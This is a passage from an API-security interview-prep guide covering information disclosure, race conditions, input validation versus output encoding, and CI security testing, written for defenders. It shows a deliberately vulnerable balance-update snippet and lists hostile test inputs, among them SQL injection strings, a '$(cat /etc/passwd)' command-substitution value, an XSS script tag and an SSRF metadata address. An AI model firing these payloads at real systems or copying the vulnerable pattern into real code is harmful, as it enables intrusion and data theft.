Source code paths /app/src/controllers/user.js:42 Sanitise stack traces; do not return them
Configuration values A debug endpoint that dumps env vars No debug endpoints in production; sanitised error responses
Feature flags A response that reveals unreleased features by their presence or absence Do not expose internal flags; only expose the resulting behaviour
API keys / tokens in logs An access log that includes the full Authorization header Redact sensitive headers in logs; audit log configuration

The CORS and header leakage

Some headers leak more than they should:

  • Server and X-Powered-By — reveal framework and version; strip them.
  • X-Debug-* — if any such header is present, the response may contain debug info; remove in production.
  • Access-Control-Allow-Origin: * with credentials — this is both a misconfiguration and an information leak (the response is readable from any origin).
  • Vary: Cookie / Vary: Authorization — if present, tells the attacker the response varies by these; not a leak per se, but useful reconnaissance.

The unified error body

The cleanest defense against information disclosure is a single error response shape — RFC 7807 (Volume 8, Question 5) — with:

  • A generic message for the client (no stack trace, no SQL, no internal paths).
  • A correlation ID for support (the client can report it, the developer can find the log entry).
  • A stable error code for the client's logic (not the exception class name).

The full error — the stack trace, the internal state, the exception message — is logged server-side with the same correlation ID. The client sees the sanitised version; the developer sees the full version; the two are linked by the ID.

Common Pitfall

Returning 404 for missing resources but 403 for forbidden ones. The distinction is helpful for legitimate users, but it is an enumeration oracle — the attacker learns which IDs exist. For sensitive resources, return 404 for both (hide existence) and log the 403 internally.

Interview Framing

Say: "Enumeration is the response revealing existence — through the message, the status code, the timing, or the body. The fix is generic responses, constant-time comparisons, dummy work for nonexistent users, non-sequential IDs, and rate limiting. And sanitise every error response — stack traces and internal paths belong in logs, not in the response." That covers the mechanisms and the defenses.

What are race conditions in API design, and how do you prevent them?

Short Answer

A race condition occurs when two concurrent requests interleave in a way that produces an incorrect result — a double charge, an oversold inventory, a duplicate account. The class of bug is called TOCTOU (Time of Check to Time of Use): the code checks a condition, then acts on it, and the state changed between the two. The defense: atomic operations (compare-and-set, database constraints), locks and transactions (with the right isolation level), and idempotency keys for the operations that must not duplicate.

The classic race conditions

ScenarioThe raceThe impact
Double-spend Two requests check the balance ($100), both see it, both debit $100 — balance goes to -$100 Money created from nothing
Oversold inventory Two requests check the stock (1 item), both see it available, both decrement — stock goes to -1 Orders that cannot be fulfilled
Duplicate account Two signup requests check "email available", both pass, both insert — two accounts with the same email Login ambiguity, security confusion
Coupon abuse Two requests check "coupon not used", both redeem — coupon used twice Discount fraud
Auction sniping Two bids at the last millisecond; both are accepted; the auction ends with two winners Legal dispute
Withdrawal duplication The client retries after timeout; the original request succeeded; both are processed Double withdrawal (Volume 5, Question 1)
Permission escalation Two requests: one checks "user is not admin", the other adds the admin role; the first completes after the second Unauthorized action

Why it happens

The root cause is always the same: check-then-act is not atomic. The code:

Vulnerable code
 
balance = db.get_balance(account)
if balance >= amount:
    db.set_balance(account, balance - amount)
    db.insert_withdrawal(account, amount)

Between the get_balance and the set_balance, another request can run the same code and read the same balance. Both proceed; both write; the second write overwrites the first (or the balance goes negative, depending on the write).

The defenses

DefenseHowUse case
Atomic operations UPDATE accounts SET balance = balance - 100 WHERE balance >= 100 — the check and the write are one operation The database does the check atomically
Unique constraints The database rejects the second insert (UNIQUE(email)) Duplicate signup, duplicate coupon
Conditional updates (compare-and-set) UPDATE ... SET version = version + 1 WHERE id = ? AND version = ? — if the version changed, no rows are affected Optimistic concurrency (Volume 5, Question 9)
Pessimistic locking SELECT ... FOR UPDATE — the row is locked; another transaction waits High-conflict rows (auction bid, seat booking)
Serializable transactions The database detects the conflict and one transaction is aborted Complex transactions that cannot be expressed as one statement
Distributed locks A lock service (Redis, etcd) ensures only one request proceeds Cross-service operations (Volume 6, Question 9)
Idempotency keys The second request with the same key returns the first's result, not a new operation Retries and client-side duplicates (Volume 5, Question 2)

The atomic SQL operation

The cleanest fix for the balance race is to move the check into the SQL statement:

VulnerableFixed
 
balance = SELECT balance FROM accounts WHERE id = ?
if balance >= 100:
    UPDATE accounts SET balance = balance - 100
 
UPDATE accounts SET balance = balance - 100
WHERE id = ? AND balance >= 100
# if rows affected = 0, insufficient balance

The database performs the check and the decrement atomically — no window between them. If the balance is 50 and the request tries to debit 100, the WHERE clause fails; the update affects 0 rows; the application knows the debit was rejected.

The idempotency key for retries

A client-side race is subtler. The client sends a payment request; the request times out; the client retries. The first request succeeded; the second is a duplicate. Only an idempotency key (Volume 5) solves this — the server stores the key and the result; the retry with the same key returns the stored result, not a new operation.

Without the key, the server cannot distinguish "the client retried because it did not get the response" from "the client deliberately made two requests". The key is the client's declaration that these two requests are the same logical operation.

The distributed race

When two services operate on shared state, the atomic operation is not enough — the database is shared, but the check-and-act may span services. The patterns:

  • Single service owns the state — only one service can modify the balance; the others call it. The atomic operation is inside that service.
  • Distributed lock — a lock service ensures only one operation proceeds. The lock must have a TTL (crash recovery) and a fencing token (stale lock protection) — Volume 6, Question 9.
  • Saga with compensation — the operation is a sequence of steps; each step is reversible; a conflict triggers a compensating step (Volume 5 of the distributed systems series).

The user-facing race

Not every race is a security bug — some are UX bugs. A user double-clicks "Submit" and two orders are created. The fix: disable the button after click (frontend), idempotency key (backend), and unique constraints where applicable. The frontend is a mitigation, not a fix — the backend must be safe regardless.

The race-condition test

Race conditions are hard to test because they are timing-dependent. The approaches:

  • Concurrent test — send N parallel requests to the same endpoint; verify that only one succeeds and the rest get a clear error.
  • Chaos testing — inject delays at the database layer; the race window widens; the bug appears.
  • Formal verification — for critical financial operations, model the state machine and verify the invariants.
  • Load testing at scale — the race appears under high concurrency, even if it does not appear in single-user tests.

The "it hasn't happened yet" trap

A race condition that has not occurred in testing is not absent — it is timing-dependent. A flash sale triggers it; a retry storm triggers it; a slow network triggers it. The race is present; the conditions are not. The defense is design: make the operation atomic by construction, not by testing.

Common Pitfall

Relying on the application-level lock (a mutex, a semaphore). In a single-process app, this works. In a multi-instance deployment, each instance has its own lock — two instances run the same operation concurrently. The fix: the database constraint or a distributed lock; application-level locks are single-process only.

Interview Framing

Say: "Race conditions are TOCTOU — check-then-act is not atomic. The fixes are atomic SQL operations (check in the WHERE clause), unique constraints, compare-and-set with version, pessimistic locks for high-conflict rows, and idempotency keys for retries. Never rely on application-level locks in a distributed system." That covers the mechanism and the defenses.

What is the input validation and output encoding discipline, and why is it not the same as security?

Short Answer

Input validation is checking that the input has the expected shape, type, range, and format — before using it. Output encoding is transforming the output for its destination — HTML-encoding for a web page, SQL-escaping for a database, JSON-encoding for a JSON response. Both are necessary and neither is sufficient. Validation is an allowlist of the expected; encoding is the escape for the destination. The mistake is thinking that one substitutes for the other, or that validation means the input is "safe".

Input validation — what it actually is

LayerWhat it checksExample
Syntactic Is the JSON valid? Are the types correct? Are required fields present? email must be a string; age must be an integer; id is required
Semantic Does the value make sense? Is it in the allowed set? Is it in range? age must be 0–150; country must be an ISO code; amount must be positive
Business Is the value allowed by the business rules? The user cannot order more than 10 of this item; the coupon is not expired
Authorization Is the user allowed to set this field? (Mass assignment — Question 6) is_admin is not in the allowed-fields list

The allowlist principle: validation should describe what is allowed, not what is forbidden. "Reject values containing <script>" is a denylist — trivially bypassed by <SCRIPT>, <scr<script>ipt>, or an encoding the filter does not know. "Accept only lowercase letters, digits, and hyphens, max 50 characters" is an allowlist — the attack surface is closed.

Output encoding — what it actually is

Encoding is transforming data for its destination, so that the destination treats it as data, not as code:

DestinationEncodingExample
HTML body HTML entity encoding < → &lt;; " → &quot;
HTML attribute Attribute encoding (includes quotes) " → &quot;; single-quote → &#x27;
JavaScript JS encoding (hex/unicode escapes) alert → \u0061lert
URL Percent-encoding space → %20; / → %2F in query values
SQL Parameterisation (not encoding) Send values separately from the query
Shell Argument array (not encoding) Pass args as a list, not a concatenated string
JSON JSON serialization String values are quoted and escaped by the JSON encoder
XML XML entity encoding < → &lt;; & → &amp;
CSS CSS encoding Escape special characters as \XXXX
LDAP LDAP escaping Escape *()\, NUL

The key insight: encoding is context-specific. The same input, rendered in HTML and in JavaScript, needs different encoding. A string that is safe in an HTML body may be dangerous in an HTML attribute (the quote breaks out); a string that is safe in a JSON value may be dangerous in a URL. The encoder must know the destination.

Validation vs encoding — the difference

AspectValidationEncoding
Purpose Reject unexpected input Make expected input safe for the destination
Applied to The input, on arrival The output, on rendering
Failure mode Reject the request (400) The value is displayed literally, not interpreted
Against injection Supplementary — can catch obvious attacks Definitive — the correct defense
Against bad data Definitive — the data is rejected Supplementary — encoding does not fix bad data

The "validation means safe" trap

A common mistake: "we validate the input, so we do not need to encode the output". The reasoning is wrong because:

  • Validation can be bypassed — a denylist is trivially bypassed; an allowlist that is too permissive (allowing < in a name) allows the attack.
  • Validation cannot know the destination — the same input is rendered in five different contexts; the validation does not know which one.
  • Validation is applied at a different time — the input is validated on arrival, but the rendering context is known at output time.
  • The database is a storage, not a validator — a value stored via one path may be rendered via another, and the validation of the first path does not help the second.

The correct principle: validate on input, encode on output, and do not let one substitute for the other. Both are necessary; neither is sufficient.

The framework as the encoder

Modern frameworks encode output by default:

  • React — JSX escapes string interpolation by default; dangerouslySetInnerHTML is required to bypass.
  • Django templates — auto-escape on; |safe or mark_safe is required to bypass.
  • Jinja2 — auto-escape on for HTML templates; |safe to bypass.
  • Thymeleaf — auto-escape on for HTML; th:utext to bypass.
  • Go templates — auto-escape by default; template.HTML to bypass.

The discipline: do not bypass the framework's encoder. The |safe and dangerouslySetInnerHTML escape hatches exist for cases where the developer knows the content is safe (a trusted HTML fragment), but they are the exact places where XSS happens. Every use of a bypass should be reviewed.

The library for the domain

For specific contexts, use a library that does the encoding correctly:

  • HTML sanitisation — DOMPurify, OWASP Java HTML Sanitizer, Bleach — for HTML that the user genuinely needs to include (rich text editor output).
  • Markdown rendering — a library that sanitises the HTML output of the Markdown.
  • URL construction — a URL builder that percent-encodes the components.
  • SQL — the parameterised query API of the driver (never a manual escape).
  • Shell — the argument-array API of the subprocess module (never shell=True).

The library is not a substitute for understanding the context — but it is a substitute for writing the encoding by hand, which is where the bugs live.

The comprehensive validation strategy

  1. Validate the schema — the request has the right shape (JSON Schema, OpenAPI schema, a validation library).
  2. Validate the types — each field is the right type (string, integer, boolean, date).
  3. Validate the range — each value is within its allowed bounds (length, numeric range, enum values).
  4. Validate the business rules — the request is allowed by the domain (coupon not expired, user has enough balance).
  5. Encode for the destination — HTML, SQL, JSON, XML, shell, URL — at the point of use, with the correct library.
  6. Test with malicious input — the tests include <script>, ' OR '1'='1, $(cat /etc/passwd), and verify the output is safe.
Common Pitfall

Validating the input but storing the original (unencoded) value, then rendering it in a template. The validation passed — the input is a valid string — but the rendering context (HTML) requires encoding, and the stored value has no encoding. The fix: encode at the output, not at the input; and use the framework's encoder, not a manual escape.

Interview Framing

Say: "Validate on input, encode on output, and do not let one substitute for the other. Validation is an allowlist; encoding is context-specific — HTML needs HTML encoding, SQL needs parameterisation, shell needs argument arrays. The framework's encoder is the default; the bypass is the exception, and every bypass is reviewed." That covers the discipline and the trap.

How do you test an API for security in CI — SAST, DAST, fuzzing, dependency scanning?

Short Answer

Security testing in CI has four complementary layers: SAST (static analysis — scans the code for known patterns, no running app), DAST (dynamic analysis — scans the running app for vulnerabilities, sends attack payloads), dependency scanning (checks third-party libraries against known CVEs), and fuzzing (generates random input and looks for crashes). Each catches a different class; none catches everything; together they form the baseline. On top of these, contract tests for the API and security integration tests for the critical flows (auth, authorization, payment) are the specific tests that catch the specific bugs.

LayerCatchesMissesTools
SAST Known patterns in code — SQL concatenation, hardcoded secrets, missing auth middleware, dangerous APIs Logic bugs, configuration, runtime behaviour, third-party vulnerabilities Semgrep, SonarQube, CodeQL, Snyk Code, Bandit (Python), gosec (Go)
DAST Runtime vulnerabilities — injection, XSS, auth bypass, misconfiguration, missing headers Code-level issues, business logic, deep authorization OWASP ZAP, Burp Suite (Pro), Nuclei, Nikto
Dependency scanning Known CVEs in third-party libraries Vulnerabilities in application code, zero-days, transitive dependency issues Dependabot, Snyk Open Source, OWASP Dependency-Check, Trivy, Grype
Fuzzing Crashes, hangs, memory bugs, unhandled exceptions on malformed input Logic bugs, authorization, injection (unless the payload is in the corpus) AFL++, libFuzzer, Hypothesis (property-based), go-fuzz
Contract tests API contract violations, schema breaks, compatibility Security-specific bugs Pact, Schemathesis, Dredd (Volume 3, Question 9)
Security integration tests The specific bugs the API can have — BOLA, mass assignment, enumeration, race conditions Unknown vulnerabilities Application-specific tests using the framework

SAST — static analysis

SAST scans source code without running it. The value is finding known-bad patterns:

  • Injection sinks — string concatenation in a SQL query, exec(userInput), eval() with user data.
  • Hardcoded secrets — API keys, passwords, tokens in the source.
  • Missing authentication — a route without the auth middleware.
  • Dangerous functions — pickle.load, Marshal.load, ObjectInputStream, innerHTML.
  • Insecure configuration — verify=False on TLS, CORS: * with credentials.

The limitations: SAST produces false positives (it does not understand the application's logic), it misses runtime issues (the code looks safe, the configuration is not), and it cannot find the business logic bugs (BOLA, race conditions). It is a first line, not the only line.

The integration: run SAST on every PR; fail the build on high-severity findings; use a baseline (only new findings fail) to avoid drowning in legacy issues.

DAST — dynamic analysis

DAST sends requests to a running instance — typically a staging deployment — with attack payloads and analyzes the responses:

  • Injection — send ' OR '1'='1, 1; DROP TABLE, and look for error messages or unexpected behaviour.
  • XSS — send <script>alert(1)</script> and look for it in the response unencoded.
  • Missing headers — check for Strict-Transport-Security, X-Content-Type-Options, Content-Security-Policy.
  • Misconfigurations — open directory listing, default credentials, exposed admin paths.
  • Auth bypass — access protected endpoints without a token; use expired or tampered tokens.

The limitation: DAST sees only what the scanner knows to test. It does not know the API's business logic, the specific object IDs, or the specific authorization model. It catches the generic vulnerabilities (injection, XSS, missing headers) but not the application-specific ones (BOLA, mass assignment).

The integration: DAST runs against the staging environment on a schedule (nightly, or on every merge to main); the findings are triaged; high-severity findings block deployment.

Dependency scanning

Third-party libraries are the source of many vulnerabilities — the Log4Shell incident (CVE-2021-44228) affected every Java application using a specific version of Log4j; the event-stream incident (npm) involved a malicious package; the PyPI typosquatting attacks are constant.

The tooling:

  • Dependabot (GitHub) — automated PRs for vulnerable dependencies.
  • Snyk — SCA (Software Composition Analysis) with vulnerability data and fix suggestions.
  • Trivy — scans container images, filesystems, and Git repos.
  • OWASP Dependency-Check — identifies project dependencies and checks for known CVEs.
  • Grype — container and filesystem scanner.

The integration: run on every PR and on a schedule; alert on new CVEs in the dependency tree; have a policy for update cadence and for which CVEs are acceptable risks.

Fuzzing

Fuzzing generates random or semi-random input and looks for crashes, hangs, and unexpected behaviour:

  • Input fuzzing — send malformed JSON, wrong types, huge values, unusual encodings; look for 500s (unhandled exceptions), hangs, or memory exhaustion.
  • Property-based testing — Hypothesis (Python), QuickCheck (Haskell), fast-check (TypeScript) — generate inputs satisfying a property and check the property holds.
  • Coverage-guided fuzzing — AFL++, libFuzzer — mutate the input to maximise code coverage; find the deep crashes.

The integration: fuzz the parsers, the serializers, the input validators, and the API's edge cases. A parser that crashes on a malformed input is a DoS; a validator that hangs on a crafted input is a DoS; a serializer that produces invalid output is a data-corruption bug.

The application-specific tests

The generic tools do not catch the API-specific vulnerabilities. Those need tests written for the application:

TestWhat it verifies
Two-account test Account A cannot access account B's resource (BOLA)
Mass assignment test Sending is_admin: true is rejected or ignored
Excessive exposure test The response does not contain password_hash, ssn, etc.
Enumeration test The response to a nonexistent email is the same as for an existing one
Race condition test Two concurrent requests produce one result, not two
Rate limit test Exceeding the limit returns 429, not 200
Auth bypass test Expired token, no token, tampered token — all return 401/403
SSRF test A URL pointing to 169.254.169.254 is rejected
Injection test Sending ' OR '1'='1 in every field does not cause an error
XXE test An XML with a DOCTYPE is rejected
Deserialization test A malformed serialized object is rejected

These tests are cheap to write (a few lines each), catch the specific vulnerabilities, and become regression tests — once fixed, the test prevents the bug from returning.

The triage and severity

Every finding is triaged — assigned a severity and a response time:

SeverityExampleResponse
Critical Exploitable RCE, authentication bypass, data leak Fix immediately; block all deploys
High BOLA, mass assignment, SQL injection (mitigated) Fix in the current sprint; block the affected endpoint
Medium Missing security headers, information disclosure Fix in the next sprint
Low Verbose error messages, minor misconfigurations Fix when convenient; track in the backlog
Info Informational — not a vulnerability Note and move on

The policy: critical and high are blocking; medium and low are tracked. The trap is treating every finding as critical (the team stops caring) or every finding as low (the real issues are missed). The severity is a judgment about exploitability and impact, not about the scanner's default label.

The audit and response

Security testing finds bugs; finding them is only half the work. The other half:

  • A process for fixing — a ticket, an owner, a deadline.
  • A process for verifying — the test that caught the bug becomes the regression test; the fix is confirmed.
  • A process for disclosing — if the bug affected production, the disclosure policy and the customer notification.
  • A process for learning — a postmortem; a design change that prevents the class of bug, not just the instance.
Common Pitfall

Running SAST and DAST and assuming the API is tested. The tools catch the generic vulnerabilities; the application-specific ones (BOLA, mass assignment, race conditions) require tests written for the application. The two-account test, the mass-assignment test, the concurrency test — these are what catch the OWASP API Top 10 items the scanners miss.

Interview Framing

Say: "Four layers: SAST for code patterns, DAST for runtime vulnerabilities, dependency scanning for CVEs, fuzzing for crashes. Plus the application-specific tests — two-account BOLA, mass assignment, enumeration, race conditions — that catch the OWASP API Top 10 items the tools miss. High-severity findings block deployment; everything is tracked and fixed." That covers the layers and the discipline.
